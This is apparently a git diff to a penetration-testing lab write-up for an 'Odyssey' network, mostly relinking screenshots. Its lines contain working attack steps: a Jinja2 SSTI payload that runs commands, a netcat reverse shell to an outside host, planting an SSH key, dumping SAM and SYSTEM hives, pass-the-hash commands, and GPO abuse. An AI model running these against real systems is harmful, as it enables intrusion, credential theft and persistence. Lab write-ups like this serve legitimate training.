@@ -129,7 +129,7 @@ Visiting: `http://10.1.35.240:5000` reveals the **Odyssey Portal**.
 
 The application allows us to submit template-like input.
 
-![Odyssey lab screenshot 1](./OdysseyImg/1.%20SSTI%20Syntax.png)
+![Odyssey lab screenshot 1](./OdysseyImg/2.Temp-input.png)
 
 Whenever user-controlled input appears to be processed dynamically by a server-side template engine, several attack classes are worth considering.
 
@@ -150,7 +150,7 @@ We test a mathematical syntax like `{{7*7}}` and see that it is vulnerable.
 {{7*7}}
 ```
 
-![Odyssey lab screenshot 2](./OdysseyImg/2.%20Temp-input.png)
+![Odyssey lab screenshot 2](./OdysseyImg/1.SSTI Syntax.png)
 
 Instead of displaying the expression literally, the application evaluates it.
 
@@ -171,7 +171,7 @@ For example:
 
 The application returns: `7777777`
 
-![Odyssey lab screenshot 3](./OdysseyImg/3.%20SSTI%20Inject.png)
+![Odyssey lab screenshot 3](./OdysseyImg/3.SSTI Inject.png)
 
 Combined with the fact that the server is running Python/Werkzeug, this strongly indicates that the application uses **Jinja2**.
 
@@ -188,7 +188,7 @@ After identifying Jinja2, I tested whether Python objects accessible through the
 
 **And we found this payload while searching.**
 
-![Odyssey lab screenshot 4](./OdysseyImg/4.%20SSTI-RCE.png)
+![Odyssey lab screenshot 4](./OdysseyImg/4.SSTI-RCE.png)
 
 - The following payload executes the Linux `id` command:
 
@@ -196,7 +196,7 @@ After identifying Jinja2, I tested whether Python objects accessible through the
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
 ```
 
-![Odyssey lab screenshot 5](./OdysseyImg/5.%20SSTI%20-%20ID.png)
+![Odyssey lab screenshot 5](./OdysseyImg/5.SSTI - ID.png)
 
 We now have:
 
@@ -218,7 +218,7 @@ I started a listener on my attacking machine and used the SSTI vulnerability to 
 {{request.application.__globals__.__builtins__.__import__('os').popen('busybox nc 10.200.75.51 4444 -e /bin/sh').read()}}
 ```
 
-![Odyssey lab screenshot 6](./OdysseyImg/6.%20RevShell.png)
+![Odyssey lab screenshot 6](./OdysseyImg/6.RevShell.png)
 
 After the payload executes, the server connects back to our listener.
 
@@ -230,14 +230,14 @@ We now have our first foothold on **Web-01**.
 
 After obtaining access, I identified the current user:
 
-![Odyssey lab screenshot 7](./OdysseyImg/7.%20ghill_sa.png)
+![Odyssey lab screenshot 7](./OdysseyImg/7.ghill_sa.png)
 
 User :`ghill_sa`
 
 1. From the shell history, we can see that the user had previously worked with SSH keys.
 2. Most importantly, I discovered an SSH private key: `~/.ssh/id_ed25519`
 
-![Odyssey lab screenshot 8](./OdysseyImg/8.%20ssh.png)
+![Odyssey lab screenshot 8](./OdysseyImg/8.ssh.png)
 
 Retrieving SSH key for `ghill_sa` from  `id_ed25519` file
 
@@ -285,7 +285,7 @@ Using the existing SSTI/RCE , I appended my public key to: `/home/ghill_sa/.ssh/
 {{request.application.__globals__.__builtins__.__import__('os').popen('echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMvg4nET4xWI0e0MOLrwF5z5uvbniaRRfd/KvbR//S48 kali@kali" >> /home/ghill_sa/.ssh/authorized_keys').read()}}
 ```
 
-![Odyssey lab screenshot 9](./OdysseyImg/9.%20keys.png)
+![Odyssey lab screenshot 9](./OdysseyImg/9.keys.png)
 
 #### Conceptually
 
@@ -309,7 +309,7 @@ This gives us a much more stable shell than the original reverse shell.
 
 After we try to connect with SSH server with use our private key and  Web-01 has our Pub_key and will let us connect.
 
-![Odyssey lab screenshot 10](./OdysseyImg/10%20keys.png)
+![Odyssey lab screenshot 10](./OdysseyImg/10.keys.png)
 
 ---
 
@@ -317,7 +317,7 @@ After we try to connect with SSH server with use our private key and  Web-01 has
 
 Looking at `.bash_history`, the user was doing a lot of SSH stuff
 
-![Odyssey lab screenshot 11](./OdysseyImg/11.%20history.png)
+![Odyssey lab screenshot 11](./OdysseyImg/11.history.png)
 
 The private SSH key discovered earlier did not authenticate as `ghill_sa`.
 
@@ -340,11 +340,10 @@ Testing the recovered key against the root account:
 
 Getting root access to this host with this key
 
-![Odyssey lab screenshot 12](./OdysseyImg/12.%20root.png)
+![Odyssey lab screenshot 12](./OdysseyImg/12.root.png)
 
-![Odyssey lab screenshot 13](./OdysseyImg/13.%20bash_history.png)
 
-User Flag : [REDACTED FLAG]
+User Flag : HSM{SFNNeyAxMjM***********************************
 
 ---
 
@@ -363,7 +362,7 @@ This is useful because automated tools can miss contextual information that beco
 
 **While manually checking things and waiting for LinPEAS to finish, we notice that the `.bash_history` file is very large, implying it contains a lot of commands.**
 
-![Odyssey lab screenshot 14](./OdysseyImg/14.%20update.conf.png)
+![Odyssey lab screenshot 14](./OdysseyImg/13.bash_history.png)
 
 The `.bash_history` file contained references to:
 
@@ -376,7 +375,7 @@ cat update.conf | grep -ia ghill_sa -B 5 -A 5
 
 That makes `update.conf` worth investigating.
 
-![Odyssey lab screenshot 15](./OdysseyImg/15.%20remina.png)
+![Odyssey lab screenshot 15](./OdysseyImg/14.update.conf.png)
 
 ```bash
 root@ip-10-1-35-240:~# cat /etc/update.conf
@@ -448,7 +447,7 @@ For the lab, I connected using Remmina and obtained full GUI access.
 
 **We connect using `Remmina`.**
 
-![Odyssey lab screenshot 16](./OdysseyImg/16.%20sahre%20folder.png)
+![Odyssey lab screenshot 16](./OdysseyImg/15.remina.png)
 
 Full GUI Access
 
@@ -458,7 +457,7 @@ Full GUI Access
 
 Inside WKST-01, I discovered a `shared` directory containing several files with credentials for different internal services and users.
 
-![Odyssey lab screenshot 17](./OdysseyImg/17.%20Credential.png)
+![Odyssey lab screenshot 17](./OdysseyImg/16.share folder.png)
 
 Examples included accounts associated with:
 
@@ -477,7 +476,7 @@ Training
 
 The shared directory exposed several credentials.
 
-![Odyssey lab screenshot 18](./OdysseyImg/18.%20SeBackUpPrivilege.png)
+![Odyssey lab screenshot 18](./OdysseyImg/17.Credential.png)
 
 This is a significant finding because shared folders containing plaintext credentials can create a direct path for lateral movement.
 
@@ -540,7 +539,7 @@ Members of this group can receive powerful privileges related to backing up and 
 
 Checking privileges revealed:
 
-![Odyssey lab screenshot 19](./OdysseyImg/19.%20SMBShare.png)
+![Odyssey lab screenshot 19](./OdysseyImg/18.SeBackUpPrivilege.png)
 
 Although `SeBackupPrivilege` initially appeared disabled, the account's group membership still gave us a potential path to sensitive system files.
 
@@ -615,7 +614,7 @@ impacket-smbserver -smb2support -username test -password test MyServer .
 
 **From WKST-01, I access our SMB folder and transfer the files.**
 
-![Odyssey lab screenshot 20](./OdysseyImg/20.%20Restricted.png)
+![Odyssey lab screenshot 20](./OdysseyImg/19.SMBShare.png)
 
 We now have: `SAM.save` and `SYSTEM.save` on our attacking machine.
 
@@ -687,7 +686,7 @@ This technique is known as: `Pass-the-Hash (PtH).`
 xfreerdp3 /v:10.1.40.34 /u:'Administrator' /pth:'d5cad8a9782b2879bf316f56936f1e36'
 ```
 
-![Odyssey lab screenshot 21](./OdysseyImg/21.%20EDR.png)
+![Odyssey lab screenshot 21](./OdysseyImg/20.Restricted.png)
 
 **I therefore tested the hash over SMB with NetExec and confirmed that it was valid.**
 
@@ -712,7 +711,7 @@ We now have administrative execution on the workstation.
 nxc smb 10.1.40.34 -u 'Administrator' -H 'd5cad8a9782b2879bf316f56936f1e36' --local-auth -x 'net localgroup Administrators ghill_sa /add' --smb-timeout 30
 ```
 
-![Odyssey lab screenshot 22](./OdysseyImg/22.%20GPO.png)
+![Odyssey lab screenshot 22](./OdysseyImg/21.EDR.png)
 
 **Using `impacket-net` provided an alternative way to perform the same authorized administrative change.**
 
@@ -838,7 +837,7 @@ At this point, the attack becomes a **GPO abuse** scenario.
 
 **BloodHound recommends using `pyGPOAbuse` for this abuse.**
 
-![Odyssey lab screenshot 23](./OdysseyImg/24.%20GPOAbuse.png)
+![Odyssey lab screenshot 23](./OdysseyImg/22.GPO.png)
 
 ---
 
@@ -846,7 +845,7 @@ At this point, the attack becomes a **GPO abuse** scenario.
 
 **I then reviewed the required `pyGPOAbuse` syntax and the GPO identifier discovered through the collected relationship data.**
 
-![Odyssey lab screenshot 24](./OdysseyImg/25.%20GPOID.png)
+![Odyssey lab screenshot 24](./OdysseyImg/24.GPOAbuse.png)
 
 1. Obtain the GPO ID from BloodHound 
 
@@ -865,7 +864,7 @@ The tool successfully created a scheduled task:
 This confirms that the GPO permissions are exploitable.
 
 The GPO ID can be identified in the BloodHound relationship data.
-
+![Odyssey lab screenshot 24](./OdysseyImg/25.GPOID.png)
 
 
 At this stage, the GPO control could be abused in multiple ways. For the lab, two practical options were:
